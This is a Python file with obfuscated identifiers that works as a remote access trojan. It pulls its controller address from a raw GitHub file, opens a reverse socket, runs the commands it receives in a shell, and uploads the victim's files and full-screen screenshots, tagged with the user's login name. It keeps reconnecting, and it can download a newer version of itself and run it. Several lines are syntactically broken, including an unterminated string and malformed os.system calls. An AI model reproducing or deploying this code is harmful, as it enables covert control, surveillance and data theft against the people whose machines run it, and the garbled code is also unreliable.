import sys,subprocess,socket,time,requests
from PIL import ImageGrab
WPEjpRLCkKyCctrD = "04.12.24.8"
dIRIHAmbtoLzfLMrOpC = ""
aDqSdYrXtFmMA = ""
oIHCYIlnpeJvwPIbJGo = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
CyqBizVWSfQQhgYTCfvFO = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
XvLrNOADK = "!"
def yopYzadzlKfajWDonVs(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	return s
def oikgZzboLtc(s):
	CvdMAHlLKhcjlHdfybD = s.recv(1024)
	if len(CvdMAHlLKhcjlHdfybD)==0:
		return True
	gRXpESeCm = CvdMAHlLKhcjlHdfybD.decode("utf-8")
	if not gRXpESeCm.startswith(XvLrNOADK):
		proc = subprocess.run(CvdMAHlLKhcjlHdfybD.decode("utf-8"), shell=True, capture_output=True)
		result = proc.stdout + proc.stderr
		s.send(result)
		return
	ENgYQAkguhfYHPUbZ = gRXpESeCm.split(" ")[0][1:]
	if ENgYQAkguhfYHPUbZ == "download":
		lwwoFKi(s, gRXpESeCm)
	elif ENgYQAkguhfYHPUbZ == "screenshot":
		jFzLZtXdDqpdAMWZbOTV(s)
	elif ENgYQAkguhfYHPUbZ == "doUXyzaIPq":
		s.send(bytes(WPEjpRLCkKyCctrD, "utf-8"))
def lwwoFKi(s, gRXpESeCm):
	EGvasDBdeVBFnEJSKiL = gRXpESeCm.replace(XvLrNOADK+"download ","").split(",")
	results = []
	for f in EGvasDBdeVBFnEJSKiL:
		results += UABuWnDFATKyQCeA(f, "api/file/", { "type":os.path.splitext(f)[1] })
	if results == []:
		s.send(b"[+]
	s.send(bytes("\n".join(results), "utf-8"))
def jFzLZtXdDqpdAMWZbOTV(gRXpESeCm):
	jDICTCthqdGxXKVV = ImageGrab.grab(
		bbox=None,
		include_layered_windows=False,
		all_screens=True,
		xdisplay=None
	)
	fpath = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	jDICTCthqdGxXKVV.save(fpath)
	jDICTCthqdGxXKVV.close()
	r = UABuWnDFATKyQCeA(fpath, "api/sscap")
	os.remove(fpath)
	s.send(r)
def UABuWnDFATKyQCeA(QIEkpLCrCnSSLauMtqb, DbNoSbcmbLvx, GJduCurc=None):
	if not os.path.exists(QIEkpLCrCnSSLauMtqb):
		return "[!] NOT FOUND: "+QIEkpLCrCnSSLauMtqb+"\n"
	headers = {"user":os.getlogin()}
	if GJduCurc is not None:
		headers = {**headers, **GJduCurc}
	requests.post(dIRIHAmbtoLzfLMrOpC+":"+aDqSdYrXtFmMA+"/"+DbNoSbcmbLvx,
		files={open(QIEkpLCrCnSSLauMtqb, "rb")},
		headers=headers)
	return "[+] SUCCESS: "+QIEkpLCrCnSSLauMtqb+"\n"
def BEcVkQVxTmAyrbMfAEfat():
	if dIRIHAmbtoLzfLMrOpC == "" or aDqSdYrXtFmMA == "":
		CvdMAHlLKhcjlHdfybD = requests.get(oIHCYIlnpeJvwPIbJGo).text.replace("\n","").split(":")
		dIRIHAmbtoLzfLMrOpC = CvdMAHlLKhcjlHdfybD[0].strip()
		aDqSdYrXtFmMA = CvdMAHlLKhcjlHdfybD[1].strip()
		doUXyzaIPq = CvdMAHlLKhcjlHdfybD[2].strip()
	return dIRIHAmbtoLzfLMrOpC, aDqSdYrXtFmMA, doUXyzaIPq
def YAChSzQzkRi():
	NKqMiMHwOSHhTRKB = os.path.basename(__file__)
	fileType = NKqMiMHwOSHhTRKB.split(".")[-1]
	uknoXqZWBO = NKqMiMHwOSHhTRKB.replace(fileType,"") +"."+WPEjpRLCkKyCctrD + fileType
	efoKUnYsNr = os.path.join(os.path.getcwd(), uknoXqZWBO)
	with open(uknoXqZWBO, "wb+") as f:
		f.write(requests.get(CyqBizVWSfQQhgYTCfvFO+"/file"+efoKUnYsNr.split(".")[-1]))
	if fileType == ".exe":
		os.system(".\"+efoKUnYsNr)
	elif fileType == ".pyw":
		os.system("python "+efoKUnYsNr")
def KBYAPgfE():
	pass
def RxLncggjLizwoaxSODlVTS():
	h, p, v = BEcVkQVxTmAyrbMfAEfat()
	if WPEjpRLCkKyCctrD != v:
		YAChSzQzkRi()
	KBYAPgfE()
	xmmsObpeNqgFOT = bytes("["+WPEjpRLCkKyCctrD+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				aIqlrCpXpEIBq=False
				try:
					s=yopYzadzlKfajWDonVs(h, p)
					while not aIqlrCpXpEIBq:
						s.send(xmmsObpeNqgFOT)
						aIqlrCpXpEIBq=oikgZzboLtc(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
sys.exit(RxLncggjLizwoaxSODlVTS())
